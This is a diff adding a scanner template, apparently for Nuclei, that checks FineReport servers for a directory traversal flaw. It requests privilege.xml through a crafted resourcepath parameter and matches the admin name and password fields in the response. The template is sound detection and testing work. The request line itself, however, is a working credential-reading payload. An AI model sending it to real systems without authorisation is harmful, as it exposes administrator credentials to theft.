@@ -1,0 +1,22 @@
+id: poc-yaml-finereport-directory-traversal
+info:
+  name: Finereport Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: directory-traversal
+  description: |
+    Detects a directory traversal vulnerability in FineReport by attempting to access sensitive files.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<rootManagerName>"
+          - "<rootManagerPassword>"
+        part: body
